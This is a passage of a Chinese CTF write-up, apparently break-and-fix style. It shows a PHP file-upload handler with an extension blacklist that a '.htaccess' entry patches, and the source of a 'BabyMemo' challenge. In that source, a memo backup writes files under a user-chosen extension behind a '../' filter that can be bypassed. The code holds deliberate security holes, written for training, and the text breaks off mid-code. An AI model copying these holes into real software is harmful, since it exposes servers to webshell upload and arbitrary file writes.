class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">1</span>);<br><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;WWW_ROOT&quot;</span>,<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>]);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;APP_ROOT&quot;</span>,<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>)));<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;APP_URL_ROOT&quot;</span>,<span class="hljs-title function_ invoke__">str_replace</span>(WWW_ROOT,<span class="hljs-string">&quot;&quot;</span>,APP_ROOT));<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;UPLOAD_PATH&quot;</span>, <span class="hljs-string">&quot;upload&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><br><br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//收尾去空</span><br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件不允许上传!&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;div id=<span class="hljs-string">&quot;upload_panel&quot;</span>&gt;<br>            &lt;form enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> onsubmit=<span class="hljs-string">&quot;return checkFile()&quot;</span>&gt;<br>                &lt;p&gt;请选择要上传的图片：&lt;p&gt;<br>                &lt;input <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">input_file</span>&quot; <span class="hljs-title">type</span>=&quot;<span class="hljs-title">file</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">upload_file</span>&quot;/&gt;</span><br><span class="hljs-class">                &lt;<span class="hljs-title">input</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">button</span>&quot; <span class="hljs-title">type</span>=&quot;<span class="hljs-title">submit</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">submit</span>&quot; <span class="hljs-title">value</span>=&quot;上传&quot;/&gt;</span><br><span class="hljs-class">            &lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">msg</span>&quot;&gt;</span><br><span class="hljs-class">                &lt;?<span class="hljs-title">php</span> </span><br><span class="hljs-class">                    <span class="hljs-title">if</span>($<span class="hljs-title">msg</span> != <span class="hljs-title">null</span>)</span>&#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;提示：&quot;</span>.<span class="hljs-variable">$msg</span>;<br>                    &#125;<br>                <span class="hljs-meta">?&gt;</span><br>            &lt;/div&gt;<br>            &lt;div id=<span class="hljs-string">&quot;img&quot;</span>&gt;<br>                <span class="hljs-meta">&lt;?php</span><br>                    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$is_upload</span>)&#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;&#x27;</span>.<span class="hljs-variable">$img_path</span>.<span class="hljs-string">&#x27;&quot; width=&quot;250px&quot; /&gt;&#x27;</span>;<br>                    &#125;<br>                <span class="hljs-meta">?&gt;</span><br>            &lt;/div&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure><p>黑名单中加个<code>.htaccess</code>可以直接过check</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.php1&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.pHp1&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);<br></code></pre></td></tr></table></figure><h1 id="web-BabyMemo"><a href="#web-BabyMemo" class="headerlink" title="web-BabyMemo"></a>web-BabyMemo</h1><h2 id="Break-2"><a href="#Break-2" class="headerlink" title="Break"></a>Break</h2><p>扫目录下载<code>www.zip</code></p><p>index.php部分源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ob_start</span>();<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;memos&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;memos&#x27;</span>] = [];<br>        &#125;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script&gt;window.location.href=&quot;memo.php&quot;;&lt;/script&gt;&#x27;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script&gt;window.location.href=&quot;index.php?error=1&quot;;&lt;/script&gt;&#x27;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">ob_end_flush</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>memo.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: index.php&#x27;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;memo&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;memo&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;memos&#x27;</span>][] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;memo&#x27;</span>];<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;backup&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$backupMemos</span> = <span class="hljs-title function_ invoke__">implode</span>(PHP_EOL, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;memos&#x27;</span>]);<br><br>    <span class="hljs-variable">$random</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">8</span>));<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;/tmp/&#x27;</span> . <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] . <span class="hljs-string">&#x27;_&#x27;</span> . <span class="hljs-variable">$random</span>;<br><br>    <span class="hljs-comment">// Handle compression method and file extension</span><br>    <span class="hljs-variable">$compressionMethod</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;compression&#x27;</span>] ?? <span class="hljs-string">&#x27;none&#x27;</span>;<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$compressionMethod</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;gzip&#x27;</span>:<br>            <span class="hljs-variable">$compressedData</span> = <span class="hljs-title function_ invoke__">gzencode</span>(<span class="hljs-variable">$backupMemos</span>);<br>            <span class="hljs-variable">$filename</span> .= <span class="hljs-string">&#x27;.gz&#x27;</span>;<br>            <span class="hljs-variable">$mimeType</span> = <span class="hljs-string">&#x27;application/gzip&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;bzip2&#x27;</span>:<br>            <span class="hljs-variable">$compressedData</span> = <span class="hljs-title function_ invoke__">bzcompress</span>(<span class="hljs-variable">$backupMemos</span>);<br>            <span class="hljs-variable">$filename</span> .= <span class="hljs-string">&#x27;.bz2&#x27;</span>;<br>            <span class="hljs-variable">$mimeType</span> = <span class="hljs-string">&#x27;application/x-bzip2&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;zip&#x27;</span>:<br>            <span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();<br>            <span class="hljs-variable">$zipFilename</span> = <span class="hljs-variable">$filename</span> . <span class="hljs-string">&#x27;.zip&#x27;</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$zipFilename</span>, <span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">CREATE</span>) === <span class="hljs-literal">true</span>) &#123;<br>                <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$backupMemos</span>);<br>                <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>            &#125;<br>            <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$zipFilename</span>;<br>            <span class="hljs-variable">$mimeType</span> = <span class="hljs-string">&#x27;application/zip&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;none&#x27;</span>:<br>            <span class="hljs-variable">$compressedData</span> = <span class="hljs-variable">$backupMemos</span>;<br>            <span class="hljs-variable">$filename</span> .= <span class="hljs-string">&#x27;.txt&#x27;</span>;<br>            <span class="hljs-variable">$mimeType</span> = <span class="hljs-string">&#x27;text/plain&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-comment">// I don&#x27;t know what extension this is, but I&#x27;ll still give you the file. Don&#x27;t play any tricks, okay~</span><br>            <span class="hljs-variable">$compressedData</span> = <span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-variable">$backupMemos</span>);<br>            <span class="hljs-variable">$filename</span> .= <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$compressionMethod</span>;<br>            <span class="hljs-variable">$mimeType</span> = <span class="hljs-string">&#x27;text/plain&#x27;</span>;<br>            <span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&#x27;../&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;../&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$filename</span>);<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$compressedData</span>);<br>    <span class="hljs-comment">// Send headers and output file content</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Description: File Transfer&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: &#x27;</span> . <span class="hljs-variable">$mimeType</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">&#x27;&quot;&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Length: &#x27;</span> . <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$filename</span>));<br>    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filename</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br><br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;<br>    &lt;title&gt;Memo&lt;/title&gt;<br>    &lt;style&gt;<br>        body &#123;<br>            background-color: beige;<br>            font-family: Arial, sans-serif;<br>        &#125;<br><br>        h1,<br>        h2 &#123;<br>            color: darkslategray;<br>            margin-top: <span class="hljs-number">30</span>px;<br>            margin-bottom: <span class="hljs-number">10</span>px;<br>        &#125;<br><br>        form &#123;<br>            margin: <span class="hljs-number">30</span>px auto;<br>            width: <span class="hljs-number">80</span>%;<br>            padding: <span class="hljs-number">20</span>px;<br>            background-color: white;<br>            border-radius: <span class="hljs-number">10</span>px;<br>            box-shadow: <span class="hljs-number">0</span>px <span class="hljs-number">0</span>px <span class="hljs-number">10</span>px <span class="hljs-number">2</span>px <span class="hljs-title function_ invoke__">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.3</span>);<br>        &#125;<br><br>        label &#123;<br>            display: block;<br>            margin-bottom: <span class="hljs-number">10</span>px;<br>        &#125;<br><br>        input[type=<span class="hljs-string">&quot;text&quot;</span>],<br>        select &#123;<br>            width: <span class="hljs-number">100</span>%;<br>            padding: <span class="hljs-number">10</span>px;<br>            border-radius: <span class="hljs-number">5</span>px;<br>            border: none;<br>            margin-bottom: <span class="hljs-number">20</span>px;<br>        &#125;<br><br>        button[type=<span class="hljs-string">&quot;submit&quot;</span>] &#123;<br>            background-color: darkslategray;<br>            color: white;<br>            border: none;<br>            padding: <span class="hljs-number">10</span>px <span class="hljs-number">20</span>px;<br>            border-radius: <span class="hljs-number">5</span>px;<br>            cursor: pointer;<br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br><br>&lt;body&gt;<br>    &lt;h1&gt;Welcome, <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]); <span class="hljs-meta">?&gt;</span>&lt;/h1&gt;<br>    &lt;form action=<span class="hljs-string">&quot;memo.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>        &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;memo&quot;</span>&gt;New Memo:&lt;/label&gt;<br>        &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;memo&quot;</span> id=<span class="hljs-string">&quot;memo&quot;</span> required&gt;<br>        &lt;button type=<span class="hljs-string">&quot;submit&quot;</span>&gt;Add Memo&lt;/button&gt;<br>    &lt;/form&gt;<br>    &lt;h2&gt;Here <span class="hljs-number">1</span>s Your Memos:&lt;/h2&gt;<br>    &lt;ul&gt;<br>        <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;memos&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$memo</span>) : <span class="hljs-meta">?&gt;</span><br>            &lt;li&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$memo</span>); <span class="hljs-meta">?&gt;</span>&lt;/li&gt;<br>        <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">endforeach</span>; <span class="hljs-meta">?&gt;</span><br>        <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span 